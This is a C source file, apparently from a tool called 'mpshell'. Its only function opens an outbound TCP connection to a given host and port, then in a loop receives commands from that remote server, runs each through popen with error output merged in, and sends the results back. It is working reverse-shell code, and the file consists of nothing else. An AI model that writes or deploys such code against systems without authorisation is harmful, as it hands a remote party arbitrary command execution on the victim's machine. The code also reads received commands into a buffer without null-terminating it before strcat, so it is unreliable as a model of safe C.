#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "mpshell.h"

extern bool RUN;

/* --------------------------------------------------------------------------------------------------------------- */

void openTCPChannel(const char *host, int port)
{
    FILE *pFile;
    int sockfd;
    struct sockaddr_in serverAddress; 
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(port);
    serverAddress.sin_addr.s_addr = inet_addr(host);

    ssize_t totalBytesSent;
    ssize_t numBytesSent;
    ssize_t totalBytesRead;
    ssize_t numBytesRead;


    // Creating a socket
    // -----------------
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("[ERROR] Socket creation failed => ");
        exit(EXIT_FAILURE);
    }


    // Connecting to the server
    // ------------------------
    if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0)
    {
        perror("[ERROR] Could not connect to server => ");
        exit(EXIT_FAILURE);
    }


    // Initiating buffers
    // ------------------
    struct ResultBuffer *resultBuffer = (struct ResultBuffer *) malloc(sizeof(struct ResultBuffer));
    resultBuffer->data                = (unsigned char *) malloc(INITIAL_MALLOC_SIZE);
    resultBuffer->currentReadPosition = 0;
    resultBuffer->numBytesOccupied    = 0;
    resultBuffer->numBytesAllocated   = INITIAL_MALLOC_SIZE;


    // Main loop
    // ---------
    while (RUN)
    {


        /* ------------------------------------------------------------------------------------- */

        // Read command from the server
        // ----------------------------
        uint32_t temp;
        if ((recv(sockfd, &temp, 4, 0)) < 4)
            break;

        totalBytesRead         = 0;
        numBytesRead           = 0;
        uint32_t commandLength = ntohl(temp);
        char command[commandLength+5];
        while (totalBytesRead < commandLength)
        {
            numBytesRead = recv(sockfd, &command[totalBytesRead], (commandLength-totalBytesRead), 0);
            if (numBytesRead > 0)
                totalBytesRead += numBytesRead;
        }

        /* ------------------------------------------------------------------------------------- */

        // Run the command
        // ---------------
        if ((strcmp(command, "quit") == 0) || (strcmp(command, "exit") == 0))
            break;

        if (strstr(command, "2>") == NULL) { strcat(command, " 2>&1"); }

        pFile = popen(command, "r");
        if (pFile == NULL)
        {
            /* Write error message to result buffer */
            const char *errorMessage = "[ERROR] => Could not execute command!";
            memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], errorMessage, strlen(errorMessage)+1);      
            resultBuffer->numBytesOccupied += (strlen(errorMessage)+1);
        }
        else
        {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), pFile) != NULL)
            {
                size_t resultSize = strlen(buffer);
                if (resultSize >= (resultBuffer->numBytesAllocated - resultBuffer->numBytesOccupied))
                {
                    size_t newAllocatedSize = (2 * resultBuffer->numBytesAllocated);
                    resultBuffer->data = (unsigned char *)realloc(resultBuffer->data, newAllocatedSize);
                    resultBuffer->numBytesAllocated = newAllocatedSize;
                }
                memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], &buffer[0], resultSize);    
                resultBuffer->numBytesOccupied += resultSize;           
            }
            if (resultBuffer->numBytesOccupied == 0)
            {
                const char *emptyResponse = "OK";
                memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], emptyResponse, strlen(emptyResponse)+1);
                resultBuffer->numBytesOccupied = 3;
            }
            else
            {
                /* Add '\0' to the end of response */
                resultBuffer->data[resultBuffer->numBytesOccupied] = '\0';
                resultBuffer->numBytesOccupied += 1;
            }
        }
        pclose(pFile);

        /* ------------------------------------------------------------------------------------- */

        // Send the result back to server
        // ------------------------------
        uint32_t resultLength = htonl(resultBuffer->numBytesOccupied);
        if ((send(sockfd, &resultLength, 4, 0)) < 4)
            break;

        totalBytesSent = 0;
        numBytesSent   = 0;
        while (totalBytesSent < resultBuffer->numBytesOccupied)
        {
            numBytesSent = send(sockfd, &resultBuffer->data[totalBytesSent], ((resultBuffer->numBytesOccupied)-totalBytesSent), 0);
            if (numBytesSent > 0)
                totalBytesSent += numBytesSent;
        }

        resultBuffer->numBytesOccupied = 0;
    }

    free(resultBuffer->data);
    free(resultBuffer);
    close(sockfd);
}

/* --------------------------------------------------------------------------------------------------------------- */
